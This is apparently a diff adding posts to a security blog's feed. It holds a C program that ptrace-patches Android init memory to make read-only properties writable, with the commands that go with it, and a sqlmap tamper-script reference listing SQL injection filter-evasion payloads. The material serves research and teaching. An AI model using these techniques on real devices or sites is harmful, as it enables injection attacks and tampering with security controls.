class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return secure; // 修改这里，改为return 0;</span><br><span class="line">#endif /* ALLOW_ADBD_ROOT */</span><br><span class="line">&#125;</span><br><span class="line">#endif /* !ADB_HOST */</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-injetion-init"><a href="#0x03-injetion-init" class="headerlink" title="0x03 injetion init"></a>0x03 injetion init</h3><blockquote>
+<p>mprop.c</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;memory.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">        int rc;</span><br><span class="line">        unsigned long maps, mape, addr, test, fake;</span><br><span class="line">        FILE *fp;</span><br><span class="line">        char line[512];</span><br><span class="line">        char *buffer, *ro;</span><br><span class="line"></span><br><span class="line">        fp = fopen(&quot;/proc/1/maps&quot;, &quot;r&quot;);</span><br><span class="line">        if (!fp) &#123;</span><br><span class="line">                perror(&quot;fopen&quot;);</span><br><span class="line">                return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        memset(line, 0, sizeof(line));</span><br><span class="line">        fgets(line, sizeof(line), fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        rc = sscanf(line, &quot;%08x-%08x&quot;, &amp;maps, &amp;mape);</span><br><span class="line">        if (rc &lt; 2) &#123;</span><br><span class="line">                perror(&quot;sscanf&quot;);</span><br><span class="line">                return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        buffer = (char *) malloc(mape - maps);</span><br><span class="line">        if (!buffer) &#123;</span><br><span class="line">                perror(&quot;malloc&quot;);</span><br><span class="line">                return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        rc = ptrace(PTRACE_ATTACH, 1, 0, 0);</span><br><span class="line">        if (rc &lt; 0) &#123;</span><br><span class="line">                perror(&quot;ptrace&quot;);</span><br><span class="line">                return rc;</span><br><span class="line">        &#125;</span><br><span class="line">        for (addr = maps; addr &lt; mape; addr += 4) &#123;</span><br><span class="line">                test = ptrace(PTRACE_PEEKTEXT, 1, (void *) addr, 0);</span><br><span class="line">                *((unsigned long *)(buffer + addr - maps)) = test;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ro = memmem(buffer, mape - maps, &quot;ro.&quot;, 3);</span><br><span class="line">        if (ro) &#123;</span><br><span class="line">                printf(&quot;Patching init.\n&quot;);</span><br><span class="line">                fake = 0;</span><br><span class="line">                rc = ptrace(PTRACE_POKETEXT, 1, (void *)(maps + ro - buffer), &amp;fake);</span><br><span class="line">                if (rc &lt; 0) &#123;</span><br><span class="line">                        perror(&quot;ptrace&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        free(buffer);</span><br><span class="line">        rc = ptrace(PTRACE_DETACH, 1, 0, 0);</span><br><span class="line"></span><br><span class="line">        return rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc mprop.c -o mprop</span><br><span class="line">&gt; ps |grep zygote|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">&gt; setprop ro.debuggable 1</span><br><span class="line">&gt; getprop ro.debuggable</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-default-prop&quot;&gt;&lt;a href=&quot;#0x01-default-prop&quot; class=&quot;headerlink&quot; title=&quot;0x01 default.prop&quot;&gt;&lt;/a&gt;0x01 default.prop&lt;/h3&gt;&lt;figure class
+    
+    </summary>
+    
+    
+      <category term="Android Debug" scheme="http://blog.safebuff.com/tags/Android-Debug/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android Dynamic Debug</title>
+    <link href="http://blog.safebuff.com/2016/09/08/Android-Dynamic-Debug/"/>
+    <id>http://blog.safebuff.com/2016/09/08/Android-Dynamic-Debug/</id>
+    <published>2016-09-08T04:31:04.000Z</published>
+    <updated>2016-09-08T18:06:10.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Install-Tools"><a href="#0x01-Install-Tools" class="headerlink" title="0x01 Install Tools"></a>0x01 Install Tools</h3><p>1) smalidea<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip</span><br></pre></td></tr></table></figure></p>
+<p>2) IDEA install smalidea<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Preferences &gt;&gt; Plugins &gt;&gt; Install plugin from disk</span><br></pre></td></tr></table></figure></p>
+<p>3) baksmali<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.1.3.jar -O baksmali.jar</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02-Usage"><a href="#0x02-Usage" class="headerlink" title="0x02 Usage"></a>0x02 Usage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>java -jar baksmali.jar app.apk -o app/src</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Install-Tools&quot;&gt;&lt;a href=&quot;#0x01-Install-Tools&quot; class=&quot;headerlink&quot; title=&quot;0x01 Install Tools&quot;&gt;&lt;/a&gt;0x01 Install Tools&lt;/h3&gt;&lt;p&gt;1) sma
+    
+    </summary>
+    
+    
+      <category term="Android" scheme="http://blog.safebuff.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQLMAP Tamper</title>
+    <link href="http://blog.safebuff.com/2016/09/05/SQLMAP-Tamper/"/>
+    <id>http://blog.safebuff.com/2016/09/05/SQLMAP-Tamper/</id>
+    <published>2016-09-05T07:10:42.000Z</published>
+    <updated>2016-09-05T19:40:27.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h3><p><strong>Function: 用utf8编码引号</strong></p>
+<p><strong>Platform:All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</span><br></pre></td></tr></table></figure>
+<h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h3><p><strong>Function: ‘ ==&gt; %00%27</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %00%271%00%27=%00%271</span><br></pre></td></tr></table></figure>
+<h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h3><p><strong>Function: 空格 ==&gt; %00</strong></p>
+<p><strong>Platform: Microsoft Access</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1 AND 1=1%00</span><br></pre></td></tr></table></figure>
+<h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h3><p><strong>Function: base64 encode</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; AND SLEEP(5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</span><br></pre></td></tr></table></figure>
+<h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h3><p><strong>Function: &gt; ==&gt; NOT BETWEEN 0 AND</strong></p>
+<p><strong>Platform: Mssql2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B-- ==&gt; 1 AND A NOT BETWEEN 0 AND B--```、```1 AND A = B-- ==&gt; 1 AND A BETWEEN B AND B--</span><br></pre></td></tr></table></figure>
+<h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h3><p><strong>Function: 空格 ==&gt; %09</strong></p>
+<p><strong>Platform: MySQL 5.1, SGOS</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE id = 1 ==&gt; SELECT%09id FROM%09users WHERE%09id LIKE 1</span><br></pre></td></tr></table></figure>
+<h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h3><p><strong>Function: 双url编码</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</span><br></pre></td></tr></table></figure>
+<h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h3><p><strong>Function: url编码</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br></pre></td></tr></table></figure>
+<h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h3><p><strong>Function: escape编码</strong></p>
+<p><strong>Platform: Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD%20FROM TABLE ==&gt; %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</span><br></pre></td></tr></table></figure>
+<h3 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py"></a>commalesslimit.py</h3><p><strong>Function: limit 2,3 ==&gt; LIMIT 3 OFFSET 2</strong></p>
+<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 2, 3 ==&gt; LIMIT 3 OFFSET 2</span><br></pre></td></tr></table></figure>
+<h3 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h3><p><strong>Function: MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</strong></p>
+<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</span><br></pre></td></tr></table></figure>
+<h3 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h3><p><strong>Function: CONCAT() ==&gt; CONCAT_WS()</strong></p>
+<p><strong>Platform: MySQL 5.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(1,2) ==&gt; CONCAT_WS(MID(CHAR(0),0,0),1,2)</span><br></pre></td></tr></table></figure>
+<h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3><p><strong>Function: ＝ ==&gt; like</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1</span><br></pre></td></tr></table></figure>
+<h3 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py"></a>escapequotes.py</h3><p><strong>Function: ‘ ==&gt; \‘、” ==&gt; \“</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; AND SLEEP(5)# ==&gt; 1\\\\&quot; AND SLEEP(5)#</span><br></pre></td></tr></table></figure>
+<h3 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h3><p><strong>Function: &gt; ==&gt; GREATEST</strong></p>
+<p><strong>Platform: MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B ==&gt; 1 AND GREATEST(A,B+1)=A</span><br></pre></td></tr></table></figure>
+<h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h3><p><strong>Function: 空格 ==&gt; /*!0</strong></p>
+<p><strong>Platform: MySQL 4.0.18, 5.0.22</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union ==&gt; /*!0union</span><br></pre></td></tr></table></figure>
+<h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h3><p><strong>Function: IFNULL(A, B) ==&gt; IF(ISNULL(A), B, A)</strong></p>
+<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(1, 2) ==&gt; IF(ISNULL(1),2,1)</span><br></pre></td></tr></table></figure>
+<h3 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h3><p><strong>Function: 空格 ==&gt; /**/</strong></p>
+<p><strong>Platform: MySQL</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES</span><br></pre></td></tr></table></figure>
+<h3 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h3><p><strong>Function: INSERT ==&gt; insert</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables</span><br></pre></td></tr></table></figure>
+<h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h3><p><strong>Function: AND ==&gt; /<em>!12345AND</em>/</strong></p>
+<p><strong>Platform: MySQL 5.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1-- ==&gt; 1 /*!30874AND 2&gt;1*/--</span><br></pre></td></tr></table></figure>
+<h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h3><p><strong>Function: 空格 ==&gt; 多个空格</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT foobar ==&gt; 1    UNION     SELECT   foobar</span><br></pre></td></tr></table></figure>
+<h3 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h3><p><strong>Function: union ==&gt; uniunionon</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT 2-- ==&gt; 1 UNIOUNIONN SELESELECTCT 2--</span><br></pre></td></tr></table></figure>
+<h3 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h3><p><strong>Function: unicode编码</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1</span><br></pre></td></tr></table></figure>
+<h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h3><p><strong>Function: select ==&gt; s%e%l%e%c%t</strong></p>
+<p><strong>Platform: Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE ==&gt; %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><br></pre></td></tr></table></figure>
+<h3 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h3><p><strong>Function: INSERT ==&gt; INseRt</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT ==&gt; InseRt</span><br></pre></td></tr></table></figure>
+<h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h3><p><strong>Function: INSERT ==&gt; I/**/N/**/SERT</strong></p>
+<p><strong>Platform: Mysql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT ==&gt; I/**/N/**/SERT</span><br></pre></td></tr></table></figure>
+<h3 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h3><p><strong>Function: 1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1 AND 1=1 and &apos;0having&apos;=&apos;0having&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h3><p><strong>Function: 空格 ==&gt;  sp_password</strong></p>
+<p><strong>Platform: Mssql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227--  ==&gt; 1 AND 9227=9227-- sp_password</span><br></pre></td></tr></table></figure>
+<h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h3><p><strong>Function: 空格 ==&gt; /**/</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT/**/id/**/FROM/**/users</span><br></pre></td></tr></table></figure>
+<h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h3><p><strong>Function: 空格 ==&gt; –nVNaVoPYeva%0A</strong></p>
+<p><strong>Platform:MSSQL、SQLite</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h3><p><strong>Function: 空格 ==&gt; %23nVNaVoPYeva%0A</strong></p>
+<p><strong>Platform: MySQL 4.0, 5.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h3><p><strong>Function: 空格 ==&gt; %23ngNvzqu%0A</strong></p>
+<p><strong>Platform: MySQL 5.1.41</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3><p><strong>Function: 空格 ==&gt; %0E</strong></p>
+<p><strong>Platform: Mssql 2000,2005</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</span><br></pre></td></tr></table></figure>
+<h3 id="space2mssqlblank-py-1"><a href="#space2mssqlblank-py-1" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3><p><strong>Function: 空格 ==&gt; %23%0A</strong></p>
+<p><strong>Platform: Mssql、Mysql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1%23%0AAND%23%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h3><p><strong>Function: 空格 ==&gt; %2B、%0D、%0C</strong></p>
+<p><strong>Platform: Mysql5.1</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Bid%0DFROM%0Cusers</span><br></pre></td></tr></table></figure>
+<h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h3><p><strong>Function: 空格 ==&gt; –%0A</strong></p>
+<p><strong>Platform: Mssql、Mysql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1--%0AAND--%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h3><p><strong>Function: 空格 ==&gt; +</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT+id+FROM+users</span><br></pre></td></tr></table></figure>
+<h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h3><p><strong>Function: 空格 ==&gt; %0D、%0A、%0C、%09</strong></p>
+<p><strong>Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</span><br></pre></td></tr></table></figure>
+<h3 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h3><p><strong>Function: and ==&gt; %26%26</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 %26%26 &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<h3 id="thinkphp-py"><a href="#thinkphp-py" class="headerlink" title="thinkphp.py"></a>thinkphp.py</h3><p><strong>Platform: Mysql</strong></p>
+<h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h3><p><strong>Function: 替换All为空</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
